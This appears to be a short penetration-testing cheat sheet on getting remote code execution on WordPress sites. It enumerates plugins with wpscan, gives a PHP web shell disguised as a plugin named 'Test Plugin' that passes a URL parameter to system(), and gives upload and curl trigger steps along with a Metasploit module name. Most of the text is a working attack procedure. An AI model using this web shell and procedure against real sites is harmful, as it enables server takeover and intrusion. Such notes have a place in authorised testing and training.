# WordPress Plugin Forced Enumeration + Upload RCE

When theme file editing is disabled but the plugin upload feature is not, upload a malicious plugin ZIP for RCE.

```bash
# enumerate installed plugins (aggressive detection finds more than passive)
wpscan --url http://<TARGET> --enumerate p --plugins-detection mixed

# check for known CVEs in found plugins:
wpscan --url http://<TARGET> --api-token <TOKEN>
```

If you have admin credentials but theme editor is disabled:
1. Create a minimal PHP plugin that executes commands:
```php
<?php
/*
Plugin Name: Test Plugin
*/
if(isset($_GET['cmd'])){ system($_GET['cmd']); }
?>
```
2. ZIP it: `zip plugin.zip plugin.php`
3. Upload via Plugins → Add New → Upload Plugin
4. Activate and trigger: `curl "http://<TARGET>/wp-content/plugins/plugin/plugin.php?cmd=id"`

Alternatively use Metasploit module `exploit/unix/webapp/wp_admin_shell_upload` if credentials are available.
